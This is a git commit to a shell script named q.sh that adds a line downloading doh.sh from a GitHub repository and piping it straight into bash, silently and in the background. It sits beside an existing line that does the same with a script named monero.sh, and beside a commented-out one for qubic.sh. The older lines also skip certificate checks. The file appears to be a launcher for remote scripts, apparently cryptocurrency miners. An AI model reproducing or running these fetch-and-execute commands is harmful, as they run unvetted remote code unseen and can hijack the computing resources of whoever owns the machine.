2bfb6b6d03e1b5fdf50dbcd27dfb39c839517afd
hanrzme <marcgrosier@live.cn>
2025-08-04 06:27:39 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -2,3 +2,4 @@
 
 # bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/hanrzme/qiyywnbc/main/qubic.sh) >/dev/null 2>&1 &
 bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/hanrzme/qiyywnbc/main/monero.sh) >/dev/null 2>&1 &
+bash <(wget -qO- https://raw.githubusercontent.com/hanrzme/qiyywnbc/refs/heads/main/doh.sh) >/dev/null 2>&1 &
